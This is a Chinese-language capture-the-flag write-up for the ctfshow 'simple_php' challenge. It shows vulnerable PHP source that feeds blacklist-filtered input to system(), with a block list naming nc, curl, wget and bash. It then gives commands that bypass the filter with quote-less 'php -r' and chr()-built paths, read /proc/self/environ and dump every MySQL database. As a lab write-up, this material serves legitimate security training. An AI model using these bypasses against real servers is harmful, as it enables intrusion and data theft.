# simple_php 解题报告

**Flag:** `ctfshow{ff9f699c-e2af-4e32-bef1-5aa1de556684}`

## 题目分析

源码（PHP WAF + 命令执行绕过）：

```php
<?php
ini_set('open_basedir', '/var/www/html/');
error_reporting(0);
if(isset($_POST['cmd'])){
    $cmd = escapeshellcmd($_POST['cmd']); 
    if (!preg_match('/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|{|}|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|\?|wget|\'|\"|id|whoami/i', $cmd)) {
        system($cmd);
    }
}
show_source(__FILE__);
?>
```

### 关键特点
1. **`escapeshellcmd`** — 转义 `&#;|*?~<>^()[]{}$\` 等 shell 元字符，但**不阻止多参数传递**（与 `escapeshellarg` 不同）
2. **WAF 黑名单** — 禁止了大量命令名（cat, tac, head, tail, grep, find 等）和关键字符（`.`、`flag`、`{`、`}`、`'`、`"`、`?`、`*`）
3. **`open_basedir=/var/www/html/`** — 限制 PHP 文件操作，但 `system()` 是 shell 命令，不受此限制

## 解题过程

### 阶段一：信息收集（全员）

- **文件枚举**：`du -a /var/www/html/` → 只有 `index.php`，无 flag 文件
- **根目录扫描**：`du -a -d 1 /` → 无 `/flag` 文件，只有 `.dockerenv`
- **系统确认**：Alpine Linux 3.12，Docker 容器，PHP 7.3.22 CLI，无 disable_functions

### 阶段二：突破 `php -r` 无引号执行

发现 `php -r` 可以不使用引号执行 PHP 代码：

```
POST cmd=php -r print+123;
```

成功输出 `123`。WAF 虽然禁止 `'` 和 `"`，但 PHP CLI 的 `-r` 参数接受裸代码。`escapeshellcmd` 虽转义 `()` 和 `;` 为 `\(` `\;`，但 shell 解释时会将其还原为原字符，故 PHP 能正常接收执行。

### 阶段三：路径构造绕过 WAF

WAF 禁止 `.` 和 `flag`，无法直接读取 `/flag`。但通过 `chr()` 函数构建路径：

```php
// 构建 /flag 路径: chr(47)=/, chr(102)=f, chr(108)=l, chr(97)=a, chr(103)=g
php -r echo+implode(array_map(chr,array(47,102,108,97,103)));
```

完全绕过 WAF（命令中无 `.` 也无 `flag` 子串）。

### 阶段四：探明 flag 实际位置

通过 `/proc` 确认：
- 环境变量 `FLAG=not_flag` 是占位符
- `docker-php-entrypoint` 会 source `/flag.sh` 并将 `db.sql` 导入 MySQL

### 阶段五：从 MySQL 提取 flag

使用 `mysqldump --all-databases` 转储所有数据库内容（绕过 WAF 限制），发现：

- **数据库**：`PHP_CMS`
- **表名**：`F1ag_Se3Re7`
- **列名**：`flag66_2024`

从中提取出 flag：`ctfshow{ff9f699c-e2af-4e32-bef1-5aa1de556684}`

## 关键命令记录

| 步骤 | 命令 | 结果 |
|------|------|------|
| 枚举 web 目录 | `du -a /var/www/html/` | 仅 index.php |
| 枚举根目录 | `du -a -d 1 /` | 无 flag 文件 |
| 无引号 PHP 执行 | `php -r print+123;` | 输出 123 |
| 读环境变量 | `dd if=/proc/self/environ of=/dev/stdout` | FLAG=not_flag |
| 查 MySQL 版本 | `mysql --version` | MySQL 运行中 |
| 转储数据库 | `mysqldump --all-databases` | 发现 PHP_CMS.F1ag_Se3Re7 |

## 总结

本挑战的关键在于：
1. 理解 `escapeshellcmd` 与 `escapeshellarg` 的区别 — 前者允许多参数注入
2. 发现 `php -r` 无需引号即可执行 PHP 代码
3. 利用 `chr()` 构造任意路径字符串，彻底绕过 `.` 和 `flag` 的 WAF 限制
4. flag 存储在 MySQL 数据库中而非文件系统，需要数据库枚举

**解题用时**：约 2 小时，经历文件枚举 → 环境提取 → MySQL 三阶段。
